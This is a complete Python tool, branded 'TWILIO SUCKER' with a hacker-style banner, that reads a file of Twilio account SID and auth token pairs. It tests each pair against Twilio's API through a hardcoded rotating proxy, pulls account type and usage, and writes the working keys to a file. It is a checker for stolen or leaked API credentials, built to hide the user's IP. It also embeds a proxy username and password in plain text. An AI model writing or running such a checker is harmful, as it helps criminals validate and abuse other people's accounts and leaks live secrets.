# -*- coding: utf-8 -*-
import requests
import os
from time import strftime
from datetime import datetime
import pytz
from twilio.base.exceptions import TwilioRestException
from colorama import Fore, Style, init
import urllib3
from requests.auth import HTTPBasicAuth

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

bl = Fore.BLACK
wh = Fore.WHITE
yl = Fore.YELLOW
red = Fore.RED
res = Style.RESET_ALL
gr = Fore.GREEN
ble = Fore.BLUE
cy = Fore.CYAN
mg = Fore.MAGENTA

def display_ascii_art():
    print(f"""
{cy}_____________      __.___.____    .___________      _____________ ____________  ____  __._____________________ 
\__    ___/  \    /  \   |    |   |   \_____  \    /   _____/    |   \_   ___ \|    |/ _|\_   _____/\______   \\
  |    |  \   \/\/   /   |    |   |   |/   |   \   \_____  \|    |   /    \  \/|      <   |    __)_  |       _/
  |    |   \        /|   |    |___|   /    |    \  /        \    |  /\     \___|    |  \  |        \ |    |   \\
  |____|    \__/\  / |___|_______ \___\_______  / /_______  /______/  \______  /____|__ \/_______  / |____|_  /
                 \/              \/           \/          \/                 \/        \/        \/         \/ {res}
{red}PT. TWILIO INTERNATIONAL - Coded by Luciferro v69.{res}
""")

proxy_list = [
    {
        'http': 'http://sp4pep4itc:o3ca2zSoMgav5G3+Nr@us.smartproxy.com:10000',
        'https': 'http://sp4pep4itc:o3ca2zSoMgav5G3+Nr@us.smartproxy.com:10000'
    }
]

def screen_clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_next_proxy(proxy_list, index):
    return proxy_list[index % len(proxy_list)]

def get_proxy_ip(proxy):
    try:
        response = requests.get('http://ipinfo.io/ip', proxies=proxy, timeout=5, verify=False)
        return response.text.strip()
    except Exception as e:
        return f"Could not retrieve IP ({e})"

def convert_utc_to_local(utc_dt):
    utc_zone = pytz.utc
    local_zone = pytz.timezone('Asia/Jakarta')  # Change this to your desired timezone
    utc_dt = utc_zone.localize(utc_dt)  # Localize the datetime to UTC
    local_dt = utc_dt.astimezone(local_zone)  # Convert to local time zone
    return local_dt.strftime('%a, %d %b %Y %H:%M:%S %z')

def check_account_type(account_sid, auth_token, proxy):
    try:
        url = f"https://api.twilio.com/2010-04-01/Accounts/{account_sid}.json"
        response = requests.get(url, auth=HTTPBasicAuth(account_sid, auth_token), proxies=proxy, timeout=10, verify=False)

        if response.status_code == 200:
            data = response.json()
            account_type = data.get("type", "Unknown")
            creation_date = data.get("date_created", "N/A")
            utc_creation_date = datetime.strptime(creation_date, '%a, %d %b %Y %H:%M:%S +0000') if creation_date != "N/A" else None
            formatted_creation_date = convert_utc_to_local(utc_creation_date) if utc_creation_date else "N/A"
            return f"Account Type: {account_type}", formatted_creation_date
        else:
            return f"Error fetching account type: {response.status_code} {response.reason} {response.text}", "N/A"
    except Exception as e:
        return f"Error fetching account type: {e}", "N/A"

def check_usage_records(account_sid, auth_token, proxy):
    try:
        url = f"https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Usage/Records.json"
        response = requests.get(url, auth=HTTPBasicAuth(account_sid, auth_token), proxies=proxy, timeout=10, verify=False)

        if response.status_code == 200:
            usage_data = response.json().get("usage_records", [])
            if usage_data:
                total_usage = sum([float(record.get("usage", 0)) for record in usage_data])
                return f"Total Usage: {total_usage}"
            else:
                return "No usage records found."
        else:
            return f"Error fetching usage records: {response.status_code} {response.reason} {response.text}"
    except Exception as e:
        return f"Error fetching usage records: {e}"

def check_twilio_account(account_sid, auth_token, proxy):
    try:
        url = f"https://api.twilio.com/2010-04-01/Accounts/{account_sid}.json"
        response = requests.get(url, auth=HTTPBasicAuth(account_sid, auth_token), proxies=proxy, timeout=10, verify=False)

        if response.status_code == 200:
            data = response.json()
            return data
        else:
            return f"Error: {response.status_code} {response.reason} {response.text}"
    except Exception as e:
        return f"Error: {e}"

def process_twilio_keys():
    now = strftime("%Y-%m-%d %H:%M:%S")
    display_ascii_art() 
    link = input(f'{red}Give Me List{res} {yl}==>{res} ')

    with open(link) as fp:
        for i, star in enumerate(fp):
            check = star.rstrip()
            ch = check.split('|')
            if len(ch) != 2:
                print(f"{red}Invalid line format: {star}{res}")
                continue
            account_sid = ch[0]
            auth_token = ch[1]
            
            proxy = get_next_proxy(proxy_list, i)
            print(f"{yl}Using Proxy:{res} {cy}{proxy['http']}{res}")
            
            public_ip = get_proxy_ip(proxy)
            print(f"{yl}Using IP:{res} {cy}{public_ip}{res}")

            result = check_twilio_account(account_sid, auth_token, proxy)
            
            if "Error" in result:
                print(f"{red}#{res} {ble}{account_sid}|{auth_token}{res} {yl}=======>{res} {red}{result}{res}")
            else:
                creation_date = result.get("date_created", "N/A")
                account_type_info, formatted_creation_date = check_account_type(account_sid, auth_token, proxy)
                usage_info = check_usage_records(account_sid, auth_token, proxy)
                
                print(f"{cy}#{res} {wh}{account_sid}|{auth_token}{res} {yl}=======>{res} {cy}Valid API!{res}")
                print(f"Creation Date: {formatted_creation_date}")
                print(f"Account Type Info: {account_type_info}")
                print(f"Usage Info: {usage_info}")

                with open('Twilio_Valid.txt', 'a') as save:
                    save.write(f"{account_sid}|{auth_token}|{formatted_creation_date}|{account_type_info}|{usage_info}\n")

if __name__ == "__main__":
    screen_clear()
    process_twilio_keys()
